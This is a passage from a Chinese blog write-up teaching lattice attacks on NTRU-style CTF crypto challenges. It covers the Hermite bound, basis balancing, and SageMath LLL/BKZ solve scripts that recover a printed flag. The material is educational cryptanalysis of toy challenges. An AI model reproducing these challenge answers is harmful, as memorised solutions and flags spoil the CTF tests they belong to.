style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.28806499999999996em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751935em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathdefault">n</span><span class="mord mathdefault">p</span></span></span><span style="top:-2.711935em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.28806499999999996em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.28112499999999985em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9588750000000001em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mord">2</span><span class="mord mathdefault">p</span></span></span><span style="top:-2.9188750000000003em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width='400em' height='1.28em' viewBox='0 0 400000 1296' preserveAspectRatio='xMinYMin slice'><path d='M263,681c0.7,0,18,39.7,52,119c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120c340,-704.7,510.7,-1060.3,512,-1067l0 -0c4.7,-7.3,11,-11,19,-11H40000v40H1012.3s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.28112499999999985em;"><span></span></span></span></span></span></span></span></span></span></p><p>向量v = （f’， g）</p><p>其长度为</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>e</mi><mi>n</mi><mo>=</mo><msqrt><mrow><msup><mi>f</mi><mrow><mo mathvariant="normal">′</mo><mn>2</mn></mrow></msup><mo>+</mo><msup><mi>g</mi><mn>2</mn></msup></mrow></msqrt></mrow><annotation encoding="application/x-tex">len = \sqrt {f&#x27;^2+g^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.23329099999999992em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.006709em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.9667090000000003em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width='400em' height='1.28em' viewBox='0 0 400000 1296' preserveAspectRatio='xMinYMin slice'><path d='M263,681c0.7,0,18,39.7,52,119c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120c340,-704.7,510.7,-1060.3,512,-1067l0 -0c4.7,-7.3,11,-11,19,-11H40000v40H1012.3s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.23329099999999992em;"><span></span></span></span></span></span></span></span></span></span></p><p>其中 p = 512bit  g = 128bit</p><p>一般flag长度43左右（uuid） 即f’约等于 335bit  但是很不幸  这个题目不是这样的</p><p>demo：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="number">2</span>**<span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;Do_you_like_Lattice?Addoil&#125;&#x27;</span></span><br><span class="line">f = bytes_to_long(flag)</span><br><span class="line"><span class="built_in">print</span>(f.bit_length())  <span class="comment"># 255</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">g = getPrime(<span class="number">128</span>)</span><br><span class="line">g = g</span><br><span class="line"><span class="comment">#固定</span></span><br><span class="line">temp = gmpy2.iroot(<span class="number">2</span> * p, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(temp.bit_length()) <span class="comment"># 257</span></span><br><span class="line"></span><br><span class="line">f = f + <span class="number">20192020202120222023</span>  <span class="comment">#对于bit没有 影响 因为f接近255</span></span><br><span class="line">temp2 = gmpy2.iroot(f**<span class="number">2</span>+(b*g)**<span class="number">2</span>, <span class="number">2</span>)[<span class="number">0</span>]  <span class="comment">#主要在于f g没有太大影响</span></span><br><span class="line"><span class="comment">#此外一定要注意 在python中 ^是异或  **才是平方 </span></span><br><span class="line"><span class="built_in">print</span>(temp2.bit_length())  <span class="comment">#255  乘b = 256</span></span><br></pre></td></tr></table></figure><p>满足该定理，所以是可解的</p><p>所以这个长度len是我们可以构造的，而上界是固定的，越接近上界，值越精确，所以可以通过系数调整len的值从而使得和上界更接近，但是存在问题，如果系数过大，使得长度超过了上界，则无法求解</p><p>注意我们的行列式也在乘b进行变化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="number">2</span>**<span class="number">248</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;Do_you_like_Lattice?Addoil&#125;&#x27;</span></span><br><span class="line">f = bytes_to_long(flag)</span><br><span class="line"><span class="built_in">print</span>(f.bit_length())  <span class="comment"># 255</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">g = getPrime(<span class="number">128</span>)</span><br><span class="line">g = g</span><br><span class="line"><span class="comment">#固定</span></span><br><span class="line">temp = gmpy2.iroot(<span class="number">2</span> * b * p, <span class="number">2</span>)[<span class="number">0</span>]  <span class="comment">#bit = (248 + 512) / 2</span></span><br><span class="line"><span class="built_in">print</span>(temp.bit_length()) <span class="comment"># 381</span></span><br><span class="line"></span><br><span class="line">f = f + <span class="number">20192020202120222023</span>  <span class="comment">#对于bit没有 影响 因为f接近255</span></span><br><span class="line">temp2 = gmpy2.iroot(f**<span class="number">2</span>+(b*g)**<span class="number">2</span>, <span class="number">2</span>)[<span class="number">0</span>]  <span class="comment">#主要在于f g没有太大影响</span></span><br><span class="line"><span class="comment">#此外一定要注意 在python中 ^是异或  **才是平方 </span></span><br><span class="line"><span class="built_in">print</span>(temp2.bit_length())  <span class="comment">#376</span></span><br></pre></td></tr></table></figure><p>如：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535681.png" alt="image-20240521133750724"></p><p>但是可以根据bit适当扩大,当过于大 比如1024bit的时候</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535682.png" alt="image-20240521140511937"></p><p>会发现下面的值变大了 也就不满足Hermite定理了，所以也就无法求解咯</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535683.png" alt="image-20240521140553106"></p><p>为了更好的理解这个道理，继续看下面的这个例题，easyLattice就需要进行配平</p><h2 id="格相关的大类型">格相关的大类型</h2><h3 id="ntru密码">NTRU密码</h3><p>该密码类似于RSA、DSA也是属于一种密码体系</p><h4 id="easylattice">easyLattice</h4><p>考点：格密码 NTRU 配平</p><p>解题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">47</span></span><br><span class="line"></span><br><span class="line">f = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">g = getPrime(<span class="number">128</span>)</span><br><span class="line">h = gmpy2.invert(f, p) * g % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h =&#x27;</span>, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">h = 9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443</span></span><br><span class="line"><span class="string">p = 11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947     </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>普通的NTRU入门格是解不了的</p><p>因为f太大，找不到，这就涉及到一个非常巧妙的构造格的方法了，那就是对格中的基向量进行配平，使得各方向长度接近一点。</p><p>那么什么情况下才能配平成功，就要搬出我们上面学习的Hermite定理咯，这里非常贴心的公布了flag的长度47</p><p>那么bit数大约是375左右</p><p>如果不配平的话，使用我们的Hermite测试demo！！保存 去测试发现是不满足的</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535684.png" alt="image-20240521154500351"></p><p>257  &lt; 375</p><p>存一下Hermite测试板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">b = <span class="number">2</span> ** <span class="number">0</span></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;Do_you_like_Laooooooo00000ooottice?Addoil&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">f = bytes_to_long(flag)</span><br><span class="line"><span class="built_in">print</span>(f.bit_length())  </span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">g = getPrime(<span class="number">128</span>)</span><br><span class="line">g = g</span><br><span class="line"></span><br><span class="line"><span class="comment">#行列式的值</span></span><br><span class="line">temp = gmpy2.iroot(<span class="number">2</span> * b * p, <span class="number">2</span>)[<span class="number">0</span>]  <span class="comment">#bit = (248 + 512) / 2</span></span><br><span class="line"><span class="built_in">print</span>(temp.bit_length()) </span><br><span class="line"></span><br><span class="line"><span class="comment">#最短向量的值</span></span><br><span class="line">temp2 = gmpy2.iroot(f**<span class="number">2</span>+(b*g)**<span class="number">2</span>, <span class="number">2</span>)[<span class="number">0</span>]  <span class="comment">#主要在于f g没有太大影响</span></span><br><span class="line"><span class="comment">#此外一定要注意 在python中 ^是异或  **才是平方 </span></span><br><span class="line"><span class="built_in">print</span>(temp2.bit_length())  </span><br></pre></td></tr></table></figure><p>所以进行配平</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535685.png" alt="image-20240521154657814"></p><p>此时满足Hermite定理，可以进行求解</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">GaussLatticeReduction</span>(<span class="params">v1, v2</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> v2.norm() &lt; v1.norm():</span><br><span class="line">            v1, v2 = v2, v1</span><br><span class="line">        m = <span class="built_in">round</span>( v1*v2 / v1.norm()^<span class="number">2</span> )</span><br><span class="line">        <span class="keyword">if</span> m == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> (v1, v2)</span><br><span class="line">        v2 = v2 - m*v1</span><br><span class="line"></span><br><span class="line">h = <span class="number">9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443</span></span><br><span class="line">p = <span class="number">11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947</span>     </span><br><span class="line">c = <span class="number">6388077150013017095358415295704360631706672647932184267739118115740221804173068089559645506533240372483689997499821300861865955720630884024099415936433339512125910973936154713306915269365877588850574948033131161679256849814325373882706559635563285860782658950169507940368219930971600522754831612134153314448445006958300840618894359885321144158064446236744722180819829183828290798747455324761671198097712539900569386477647697973195787663298318786718012522378981137877863153067057280649127202971806609339007027052518049995341356359016898069863799529357397514218249272201695539181908803360181347114492616706419618151757</span></span><br><span class="line"><span class="built_in">print</span>(h.nbits(),p.nbits())</span><br><span class="line">D = <span class="number">2</span>^<span class="number">256</span>  <span class="comment">#配平数与位数相关 需要学习补充 237-256次方均可解</span></span><br><span class="line"><span class="comment"># Construct lattice.</span></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, D * h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, D * p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solve SVP.</span></span><br><span class="line">shortest_vector = m.LLL()[<span class="number">0</span>]</span><br><span class="line">f, g = shortest_vector</span><br><span class="line"><span class="built_in">print</span>(f, g)</span><br><span class="line"><span class="comment">#BKZ</span></span><br><span class="line">L = m.BKZ(block_size=<span class="number">2</span>)</span><br><span class="line">shortest_vector = L[<span class="number">0</span>]</span><br><span class="line">f, g = shortest_vector</span><br><span class="line"><span class="built_in">print</span>(f, g)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(<span class="built_in">abs</span>(f))))</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#验证</span></span><br><span class="line"><span class="built_in">print</span>(QQ((f**<span class="number">2</span>+g**<span class="number">2</span>)**<span class="number">0.5</span>))</span><br><span class="line"><span class="built_in">print</span>(QQ((p/<span class="number">2</span>)**<span class="number">0.5</span>))</span><br></pre></td></tr></table></figure><p>flag：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">512 512</span><br><span class="line">-50073894085033274448337202692453522746880698077702322983028272289946704698284083256500537353714697134260425361796 -923598439793643506521260484208891374490129477915686911192431263509527780701021177518396468225804284049504314851328</span><br><span class="line">-50073894085033274448337202692453522746880698077702322983028272289946704698284083256500537353714697134260425361796 -923598439793643506521260484208891374490129477915686911192431263509527780701021177518396468225804284049504314851328</span><br><span class="line">b&#x27;SICTF&#123;e3fea01c-18f3-4638-9544-9201393940a9&#125;A\xf0\x89\x84&#x27;</span><br><span class="line">924954849091614614580872247749080872466147164448631556705831800681208387067055421806078719613226163736775252508672</span><br><span class="line">75510324462935505386352201496661374657272071149690974092911803081859274899457</span><br></pre></td></tr></table></figure><p>Reference：</p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240218020626680.png" alt="image-20240218020626680" style="zoom:33%;" /><p><a href="https://xenny.wiki/posts/crypto/Lattice/lattice-based.html#ntru">https://xenny.wiki/posts/crypto/Lattice/lattice-based.html#ntru</a></p><p><a href="https://0xffff.one/d/1641">https://0xffff.one/d/1641</a></p><hr><p>学完LLL的作用之后再回顾，给出了更简洁的实现脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">h = <span class="number">9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443</span></span><br><span class="line">p = <span class="number">11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947</span> </span><br><span class="line"></span><br><span class="line">b = <span class="number">2</span>^<span class="number">256</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">Ge = Matrix(ZZ,[[<span class="number">1</span>,b*h],</span><br><span class="line">                [<span class="number">0</span>,b*p]])</span><br><span class="line"><span class="built_in">print</span>(Ge.LLL())</span><br><span class="line">f,g = Ge.LLL()[<span class="number">0</span>]</span><br><span class="line">f,g = <span class="built_in">abs</span>(f),<span class="built_in">abs</span>(g)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(f)))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535686.png" alt="image-20240521154834935"></p><h4 id="ez-ntru">ez_ntru</h4><p>做爽了，再来一题，这是2024山警黄河流域的题目</p><p><a href="http://task.py">task.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">bits = <span class="number">2048</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  q = random_prime(<span class="number">2</span>^bits, lbound=<span class="number">2</span>^(bits - <span class="number">1</span>))</span><br><span class="line">  f = random_prime(<span class="number">2</span>^(<span class="number">3</span>*bits//<span class="number">4</span> - <span class="number">1</span>))</span><br><span class="line">  g = random_prime(<span class="number">2</span>^(bits//<span class="number">4</span> - <span class="number">1</span>))</span><br><span class="line">  <span class="keyword">if</span> gcd(f, q*g) == <span class="number">1</span>:</span><br><span class="line">    h = f.inverse_mod(q) * g % q</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">r = random_prime(<span class="number">2</span>^(<span class="number">3</span>*bits//<span class="number">4</span> - <span class="number">1</span>))</span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line"><span class="keyword">assert</span> m &lt; <span class="number">2</span>^(bits//<span class="number">4</span>)</span><br><span class="line">c = (r * h + m) % q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q = %d&#x27;</span> % q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h = %d&#x27;</span> % h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = %d&#x27;</span> % c)</span><br><span class="line">q = <span class="number">24445829856673933058683889356407393860808522483552243481673407476395441107312130500945533047834993780864465577896968035259377721441466959027298166974554621753030728893320770628116412892838297326949997096948374940319126319050202262831370086992122741039059235809755486170276098658609363789670834482459758766315965501103856358827004129316458293962968758091319313119139703281758409686502729987426264868783862562150543872477975124482520151991822540312287812454562890993596447391870392038170902308036014733295394468384998808411243690466996284064331048659179342050962003962851315539367769981491650514319735943099663094899893</span></span><br><span class="line">h = <span class="number">4913183942329791657370364901346185016154546804260113829799181697126245901054001842015324265348151984020885129647620152505641164596983663274947698263948774663097557712000980632171097748594337673511102227336174939704483645747401790373320060474777199502879236509921155985395351647045776678540066383822814858118010995298071799515355111562392871675582742450331679030377003011729873888234401630551097244308473512890467393558048369156638425711104036276296581364374424105121033213701940135560177615395895359023414249846471332180098181632276243857635719541258706892559869642925945927703702696983949003370155033272664851406633</span></span><br><span class="line">c = <span class="number">23952867341969786229998420209594360249658731959635047659110331734424497403162506614140213749790708068086973241468969253395309243550869149482017583754015801740198734485871141965939993554966887039832701333623276590311516052334557237678750680087492306461195312290860900992532859827406262394480605001436094705579158919540851727801502678160085863180222123880690741582667929660533985778430252783414931317574267109741748071838599712027351385462245528001743693258053631099442571041984251010436099847588345982312217135023484895981833846397834589554744611429133085987275209019352039744743479972391909531680560125335638705509351</span></span><br></pre></td></tr></table></figure><p>题目思路是一模一样的，</p><p>首先梳理一下该题中解决ntru问题的各bit数</p><blockquote><p>q = 2048bit</p><p>f = 1535</p><p>g = 511</p></blockquote><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535687.png" alt="image-20240521160148663"></p><p>如果不配平，显然不符合Hermite定理，所以要配平</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535688.png" alt="image-20240521160258920"></p><p>显然 当配上1024bit的系数 1535 &lt; 1537 这个格子的最短向量可求，符合Hermite定理。</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535689.png" alt="image-20240521163415112"></p><p>解决完上面的ntru 拿到了f和g 继续进行Part2，其中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = random_prime(<span class="number">2</span>^(<span class="number">3</span>*bits//<span class="number">4</span> - <span class="number">1</span>))</span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line"><span class="keyword">assert</span> m &lt; <span class="number">2</span>^(bits//<span class="number">4</span>)</span><br><span class="line">c = (r * h + m) % q</span><br></pre></td></tr></table></figure><p>推导：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>=</mo><msup><mi>f</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>∗</mo><mi>g</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>c</mi><mo>=</mo><mi>r</mi><mo>∗</mo><mi>h</mi><mo>+</mo><mi>m</mi><mtext> </mtext><mo stretchy="false">(</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>c</mi><mo>=</mo><mi>r</mi><mo>∗</mo><msup><mi>f</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>∗</mo><mi>g</mi><mo>+</mo><mi>m</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>f</mi><mi>c</mi><mo>=</mo><mi>r</mi><mi>g</mi><mo>+</mo><mi>f</mi><mi>m</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>对式子模</mtext><mi>g</mi><mtext>，得</mtext><mspace linebreak="newline"></mspace><mi>m</mi><mo>=</mo><mo stretchy="false">(</mo><mi>f</mi><mi>c</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>∗</mo><msup><mi>f</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>g</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h = f^{-1}*g~(mod~q) \\c = r * h + m ~(~mod~ q) \\c = r * f^{-1}*g + m~(mod~q)\\fc = rg + fm~(mod~q) \\对式子模g，得\\m = (fc~(mod~q))*f^{-1}~(mod~g)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" 